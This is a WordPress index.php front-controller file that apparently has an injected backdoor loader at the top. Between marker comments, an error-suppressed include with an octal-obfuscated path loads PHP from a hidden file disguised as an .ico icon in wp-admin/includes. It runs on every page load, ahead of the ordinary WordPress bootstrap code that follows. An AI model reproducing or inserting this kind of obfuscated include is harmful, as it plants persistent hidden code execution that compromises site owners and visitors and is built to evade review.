<?php
/*26bf1*/

@include "\057hom\145/sh\145rin\147h/p\165bli\143_ht\155l/w\160-ad\155in/\151ncl\165des\057.43\067e01\1467.i\143o";

/*26bf1*/

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
